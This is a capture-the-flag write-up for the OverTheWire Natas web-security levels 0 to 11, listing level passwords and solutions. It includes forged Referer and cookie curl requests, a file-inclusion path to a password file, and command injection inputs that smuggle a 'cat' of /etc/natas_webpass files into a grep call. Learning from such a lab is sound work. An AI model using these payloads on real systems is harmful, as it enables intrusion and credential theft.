# Natas
- https://overthewire.org/wargames/natas/

Natas teaches the basics of serverside web-security.

Each level of natas consists of its own website located at http://natasX.natas.labs.overthewire.org, where X is the level number. There is no SSH login. To access a level, enter the username for that level (e.g. natas0 for level 0) and its password.

Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up. All passwords are also stored in /etc/natas_webpass/. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5.

## 0
- http://natas0.natas.labs.overthewire.org
- `natas0:natas0`

## 0->1
- http://natas0.natas.labs.overthewire.org/
- `natas1:0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq`
- Solved by accessing Chrome Dev Tools and looking at DOM.

<img width="2137" alt="Screenshot 2025-05-28 at 6 33 45 PM" src="https://github.com/user-attachments/assets/4eba0538-2380-4285-b6a0-2828da22cbf8" />

## 1->2
- http://natas1.natas.labs.overthewire.org/
- `natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI`
- Right clicking was blocked, but F12 gets me to Dev Tools.

<img width="2229" alt="Screenshot 2025-05-28 at 6 36 20 PM" src="https://github.com/user-attachments/assets/a8c112fe-438e-400d-92a3-5843ad49425e" />

## 2->3
- http://natas2.natas.labs.overthewire.org/
- `natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH`
- This one involved realizing that there exists an accessible `file` directory at `http://natas2.natas.labs.overthewire.org/files`. In this directory, there is a file `users.txt` with the natas3 password.

<img width="2242" alt="Screenshot 2025-05-28 at 6 39 16 PM" src="https://github.com/user-attachments/assets/3265201d-3a7e-40a9-8fa0-3083db36a802" />
<img width="2241" alt="Screenshot 2025-05-28 at 6 46 19 PM" src="https://github.com/user-attachments/assets/bc04e8b5-66f3-432b-b313-941ee6a26e9d" />
<img width="563" alt="Screenshot 2025-05-28 at 6 47 40 PM" src="https://github.com/user-attachments/assets/03250a35-1686-4dfe-98f8-43a84483c88d" />
<img width="619" alt="Screenshot 2025-05-28 at 6 47 54 PM" src="https://github.com/user-attachments/assets/197b3680-1cb0-40a1-9e53-f9d8951c2a23" />

## 3->4
- http://natas3.natas.labs.overthewire.org/
- `natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ`
> What is robots.txt?
> 
> https://en.wikipedia.org/wiki/Robots.txt
> A robots.txt file is a plain text file that tells web crawlers, also known as spiders or bots, how they should crawl a website. It's essentially a set of instructions that specify which parts of a website should be accessed by crawlers and which should be excluded.

<img width="598" alt="Screenshot 2025-05-28 at 7 07 41 PM" src="https://github.com/user-attachments/assets/7b2d63c6-b2be-47e1-b1a9-7d2e8a84afd7" />
<img width="557" alt="Screenshot 2025-05-28 at 7 08 03 PM" src="https://github.com/user-attachments/assets/1d516330-1914-4713-8537-b6d35c7d7f13" />
<img width="615" alt="Screenshot 2025-05-28 at 7 08 15 PM" src="https://github.com/user-attachments/assets/28efd70b-e816-49c4-94d6-d01408f6d941" />

## 4->5
- http://natas4.natas.labs.overthewire.org/
- `natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK`
- Hmm, not sure what to do on this. Clue is to impersonate natas5? How to do this? How can I manipulate the request?
- Maybe something to do with the `Refresh Page` button?
- https://mayadevbe.me/posts/overthewire/natas/natas4/
- Ah, so when `index.php` is accessed, we can use Dev Tools to copy the request as a `cURL` command, then in the command, we can change the request headers `Referer` from `natas4` to `natas5`.
- But how do we know it is the request header `Referer` we need to update? https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer

<img width="2226" alt="Screenshot 2025-05-29 at 6 41 44 PM" src="https://github.com/user-attachments/assets/d89b6dc9-2821-44cb-8073-2542916cf4a1" />
<img width="2211" alt="Screenshot 2025-05-29 at 6 42 14 PM" src="https://github.com/user-attachments/assets/662e0bb9-ce5f-4989-a358-4d8c2f08a3a0" />
<img width="2550" alt="Screenshot 2025-05-29 at 6 45 36 PM" src="https://github.com/user-attachments/assets/5f97f270-ec7a-4b3c-8742-b1773935bd93" />

```bash
curl 'http://natas4.natas.labs.overthewire.org/index.php' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: en-US,en;q=0.9,es;q=0.8' \
  -H 'Authorization: Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR' \
  -H 'Connection: keep-alive' \
  -b '_ga=GA1.1.1643144631.1741815779; _ga_RD0K2239G0=GS2.1.s1748568709$o17$g1$t1748568710$j59$l0$h0' \
  -H 'Referer: http://natas5.natas.labs.overthewire.org/' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36' \
  --insecure
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "QryZXc2e0zahULdHrtHxzyYkj59kUxLQ" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>
```

## 5->6
- http://natas5.natas.labs.overthewire.org/
- `natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned`
- That `loggedin=0` in the Cookie field looked strange. Copied the command as `cURL` and ran instead with `loggedin=1` and got access.
- But why did that work?

> https://mayadevbe.me/posts/overthewire/natas/natas5/
> In this level, we will talk about cookies, not those you can eat, but HTTP-Cookies. HTTP is the protocol I mentioned in the previous level. It is stateless, meaning no information about the session/previous requests is saved on the receivers/servers side. The client/browser saves session states and sends them with new requests. With HTTP the session information is stored in cookies, allowing the otherwise stateless protocol to store and transfer stateful information.
> 
> Cookies are sent with the HTTP headers. There are different types of cookies, for example, authentication cookies (for login) or tracking cookies. Since they are stored on the client side, the client can manipulate them depending on their content. It could be plain text, encoded, hashed or a special value only the server knows how to process. The different types are easier or harder to manipulate by the client.

<img width="1511" alt="Screenshot 2025-05-30 at 7 21 30 PM" src="https://github.com/user-attachments/assets/59c5444c-2e01-4394-8773-0a4176fa3658" />

```bash
curl 'http://natas5.natas.labs.overthewire.org/' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: en-US,en;q=0.9,es;q=0.8' \
  -H 'Authorization: Basic bmF0YXM1OjBuMzVQa2dnQVBtMnpiRXBPVTgwMmMweDBNc24xVG9L' \
  -H 'Cache-Control: max-age=0' \
  -H 'Connection: keep-alive' \
  -b '_ga=GA1.1.1067986793.1744421061; _ga_RD0K2239G0=GS2.1.s1748407711$o32$g1$t1748407894$j49$l0$h0; loggedin=1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36' \
> 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas5", "pass": "0n35PkggAPm2zbEpOU802c0x0Msn1ToK" };</script></head>
<body>
<h1>natas5</h1>
<div id="content">
Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned</div>
</body>
</html>
```

Can also edit the Cookie directly via Dev Tools.
<img width="1502" alt="Screenshot 2025-05-30 at 7 27 18 PM" src="https://github.com/user-attachments/assets/af811c78-9ea1-43c2-a48c-046c67da33d2" />

## 6->7
- http://natas6.natas.labs.overthewire.org/
- `natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS`
- https://mayadevbe.me/posts/overthewire/natas/natas6/
  - Recommended https://www.w3schools.com/php/
- Hm, a bit stuck on this one.
- Ah, in source code there is a reference to `include "includes/secret.inc";`. Headed to `http://natas6.natas.labs.overthewire.org/includes/secret.inc`, and I see the following.

```
http://natas6.natas.labs.overthewire.org/includes/secret.inc
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```
- Input the `$secret` and we get `Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS`

## 7->8
- http://natas7.natas.labs.overthewire.org/
- `natas8:xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q`
- Hint: `<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->`
- Needed to change the `page=` variable in the URL. "This is a query parameter where the variable name is "page" and its value is "/etc/natas_webpass/natas8". This appears to be attempting to access a file path on the server through a parameter, which might be exploiting a directory traversal or local file inclusion vulnerability."
- https://securitytimes.wordpress.com/2017/06/25/natas7-8/
<img width="831" alt="Screenshot 2025-06-01 at 11 17 00 PM" src="https://github.com/user-attachments/assets/0389fa2d-12bb-405c-b246-227ef1a83e03" />

## 8->9
- http://natas8.natas.labs.overthewire.org/
- `natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t`
```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```
```bash
- undo bin2hex "3d3d516343746d4d6d6c315669563362" > "==QcCtmMml1ViV3b"
- undo reverse & base64_decode "==QcCtmMml1ViV3b" > atob(x.split("").reverse().join("")) > "oubWYf2kBq"
- input secret (oubWYf2kBq) > Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
```

## 9->10
- http://natas9.natas.labs.overthewire.org/
- `natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`
- This level exploits command injection vulnerability. The script takes a `needle` parameter, and directly uses it in the `passthru()` function without sanitization. Since there is no input validation, we can inject additional shell commands.
- `; ls /etc/ #`
- `; ls /etc/natas_webpass #`
- `; cat /etc/natas_webpass/natas10 #`
  - Uses a semicolon (`;`) to terminate the grep command
  - Runs `cat /etc/natas_webpass/natas10` to display the password file
  - Uses `#` to comment out the rest of the command
  - Server executes: `grep -i ; cat /etc/natas_webpass/natas10 # dictionary.txt`
```html
...
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>

Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
...
```

## 10->11
- http://natas10.natas.labs.overthewire.org/
- `natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk`
- Looks like some input sanitization was added. Certain characters are now not allowed. Can we exploit another way?
- Yes, there's another way to achieve command injection-like behavior to read files without using `;`, `|`, or `&`, by manipulating the arguments of the `grep` command itself. The PHP script executes the command: `passthru("grep -i $key dictionary.txt");` The filter `preg_match('/[;|&]/',$key)` prevents the use of semicolon, pipe, and ampersand characters in the `$key` variable. However, other shell metacharacters or simply the structure of shell command arguments can be used. You can make grep read from an arbitrary file by passing the filename as an argument.
- We can combine `grep` with a regex expression, `^`. The `^` character in a regular expression is an anchor that matches the beginning of a line. When you use `^` as the entire pattern, `grep` looks for lines that have a beginning. Since every line in a file has a beginning (even an "empty" line that just contains a newline character), this pattern will match every line in the specified file.
- Therefore, the command `grep ^ ~/slack/sandbox/LICENSE` will effectively print all lines from the file `~/slack/sandbox/LICENSE` to the standard output. It's a way to display the entire content of a file, similar in output to `cat ~/slack/sandbox/LICENSE` for non-empty files, but it does so by matching a pattern at the start of each line.
```html
<body>
<h1>natas10</h1>
<div id="content">

For security reasons, we now filter on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
```
